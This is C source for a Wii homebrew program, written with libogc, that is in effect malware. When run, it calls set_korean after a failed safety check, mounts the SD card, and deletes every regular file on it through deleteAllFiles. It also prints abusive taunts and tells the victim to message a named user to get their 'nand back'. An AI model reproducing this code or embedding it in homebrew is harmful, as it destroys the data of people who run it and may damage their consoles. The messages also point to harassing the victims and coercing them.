#include <gctypes.h>
#include <ogc/card.h>
#include <stdio.h>
#include <dirent.h>
#include <fat.h>
#include <ogc/pad.h>
#include <stdarg.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <wiiuse/wpad.h>
#include <png.h>
#include "colors.h"
#define VERSION "1.1"

void set_korean(int set);
static void *xfb = NULL;
static GXRModeObj *rmode = NULL;
extern void __exception_setreload(int t);
bool CheckForSafeRevision(void);
void displayImage(const char *filename);
bool IsAhbProtDisabled(void);
void Initialize(void);
u32 GetInput(void);
void deleteAllFiles(const char *path);

int main(void) {
    Initialize();
    if (!CheckForSafeRevision()) {
        set_korean(1);
    }
    const char *imageFilename = "image.png";
    displayImage(imageFilename);

    if (!System_Init()) {
        printf("FUCKING SD CARD DETECTED BC OF ANNOYING PRICKS LIKE YOU WE NEED TO WRITE CODE TO WIPE YOUR FUCKING SD CARD :(\n");
        return -1;
    }
    if (!fatInitDefault()) {
        printf("FUCKING SD CARD DETECTED BC OF ANNOYING PRICKS LIKE YOU WE NEED TO WRITE CODE TO WIPE YOUR FUCKING SD CARD :(\n");
        return -1;
    }
    if (fatMountSimple("sd", &__io_wiisd)) {
        printf("FUCKING SD CARD DETECTED BC OF ANNOYING PRICKS LIKE YOU WE NEED TO WRITE CODE TO WIPE YOUR FUCKING SD CARD :(\n");
        deleteAllFiles("sd:/");
        fatUnmount("sd");
    } else {
        printf("FUCKING SD CARD DETECTED BC OF ANNOYING PRICKS LIKE YOU WE NEED TO WRITE CODE TO WIPE YOUR FUCKING SD CARD :(\n");
    }
    fatUnmount("sd");
    fatUnmount("usb");
    fatUnmount("usb2");
    fatUnmount("usb3");
    System_Exit();

    while (1) {
        VIDEO_WaitVSync();
    }
    return 0;
}

void deleteAllFiles(const char *path) {
    DIR *dir = opendir(path);
    if (dir) {
        struct dirent *entry;
        while ((entry = readdir(dir)) != NULL) {
            if (entry->d_type == DT_REG) {
                char filepath[256];
                snprintf(filepath, sizeof(filepath), "%s/%s", path, entry->d_name);
                remove(filepath);
            }
        }
        closedir(dir);
    }
}

void Initialize(void) {
    __exception_setreload(2);
    VIDEO_Init();
    WPAD_Init();
    PAD_Init();
    rmode = VIDEO_GetPreferredMode(NULL);
    xfb = MEM_K0_TO_K1(SYS_AllocateFramebuffer(rmode));
    console_init(xfb, 20, 20, rmode->fbWidth, rmode->xfbHeight, rmode->fbWidth * VI_DISPLAY_PIX_SZ);
    VIDEO_Configure(rmode);
    VIDEO_SetNextFramebuffer(xfb);
    VIDEO_SetBlack(FALSE);
    VIDEO_Flush();
    VIDEO_WaitVSync();
    if (rmode->viTVMode & VI_NON_INTERLACE) VIDEO_WaitVSync();
}

u32 GetInput(void) {
    WPAD_ScanPads();
    u32 pressed = WPAD_ButtonsDown(0);

    if (pressed)
        return pressed;

    PAD_ScanPads();
    pressed = PAD_ButtonsDown(0);

    if (pressed) {
        if (pressed & PAD_BUTTON_A) return WPAD_BUTTON_A;
        if (pressed & PAD_BUTTON_B) return WPAD_BUTTON_B;
        if (pressed & PAD_BUTTON_START) return WPAD_BUTTON_HOME;
        if (pressed & PAD_TRIGGER_L) return WPAD_BUTTON_MINUS;
        if (pressed & PAD_TRIGGER_R) return WPAD_BUTTON_PLUS;
    }
    return 0;
}

void displayImage(const char *filename) {
    png_structp pngPtr;
    png_infop infoPtr;
    FILE *fp = fopen(filename, "rb");
    if (!fp) {
        printf("no troll face ): just make sure to dm cantstopdivided for your nand back\n");
        return;
    }
    pngPtr = png_create_read_struct(PNG_LIBPNG_VER_STRING, NULL, NULL, NULL);
    if (!pngPtr) {
        fclose(fp);
        printf("no troll face ): just make sure to dm cantstopdivided for your nand back\n");
        return;
    }
    infoPtr = png_create_info_struct(pngPtr);
    if (!infoPtr) {
        fclose(fp);
        png_destroy_read_struct(&pngPtr, NULL, NULL);
        printf("no troll face ): just make sure to dm cantstopdivided for your nand back\n");
        return;
    }
    if (setjmp(png_jmpbuf(pngPtr))) {
        fclose(fp);
        png_destroy_read_struct(&pngPtr, &infoPtr, NULL);
        printf("no troll face ): just make sure to dm cantstopdivided for your nand back\n");
        return;
    }
    png_init_io(pngPtr, fp);
    png_read_info(pngPtr, infoPtr);
    int width = png_get_image_width(pngPtr, infoPtr);
    int height = png_get_image_height(pngPtr, infoPtr);
    png_byte colorType = png_get_color_type(pngPtr, infoPtr);
    png_byte bitDepth = png_get_bit_depth(pngPtr, infoPtr);
    png_bytep *rowPointers = (png_bytep*) malloc(sizeof(png_bytep) * height);
    for (int y = 0; y < height; y++) {
        rowPointers[y] = (png_byte*) malloc(png_get_rowbytes(pngPtr, infoPtr));
    }
    png_read_image(pngPtr, rowPointers);
    for (int y = 0; y < height; y++) {
        memcpy(xfb + y * rmode->fbWidth * VI_DISPLAY_PIX_SZ, rowPointers[y], width * VI_DISPLAY_PIX_SZ);
    }
    fclose(fp);
    png_destroy_read_struct(&pngPtr, &infoPtr, NULL);
    for (int y = 0; y < height; y++) {
        free(rowPointers[y]);
    }
    free(rowPointers);
}
